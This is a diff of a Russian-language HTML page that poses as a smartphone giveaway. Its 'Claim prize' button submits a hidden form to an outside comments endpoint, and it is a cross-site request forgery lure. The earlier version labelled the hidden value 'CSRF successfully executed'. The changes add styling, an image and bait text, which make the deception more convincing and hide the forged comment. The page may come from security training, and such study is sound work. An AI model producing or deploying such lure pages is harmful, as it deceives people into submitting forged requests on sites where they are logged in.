@@ -3,13 +3,47 @@
 <head>
   <meta charset="UTF-8">
   <title>Поздравляем!</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      text-align: center;
+      background: linear-gradient(to bottom, #f0f8ff, #ffffff);
+      padding: 30px;
+    }
+    h1 {
+      color: #2a8f2a;
+      font-size: 32px;
+    }
+    p {
+      font-size: 18px;
+    }
+    img {
+      max-width: 300px;
+      border-radius: 16px;
+      margin: 20px 0;
+      box-shadow: 0 0 10px rgba(0,0,0,0.3);
+    }
+    button {
+      padding: 12px 24px;
+      font-size: 16px;
+      background-color: #4CAF50;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #3e8e41;
+    }
+  </style>
 </head>
 <body>
-  <h1>🎉 Вы стали победителем!</h1>
-  <p>Ваш подарок уже почти у вас. Просто нажмите кнопку ниже:</p>
+  <h1>🎉 Поздравляем!</h1>
+  <p>Вы стали победителем розыгрыша смартфона!</p>
+  <img src="https://cdn.pixabay.com/photo/2018/03/01/14/40/phone-3190204_960_720.jpg" alt="Смартфон">
   <form action="https://kazcyber.zapto.org/comments.php" method="POST">
-    <input type="hidden" name="comment" value="🔥 CSRF успешно выполнен">
-    <button type="submit">Получить приз</button>
+    <input type="hidden" name="comment" value="Я выиграл смартфон!">
+    <button type="submit">Забрать приз</button>
   </form>
 </body>
 </html>
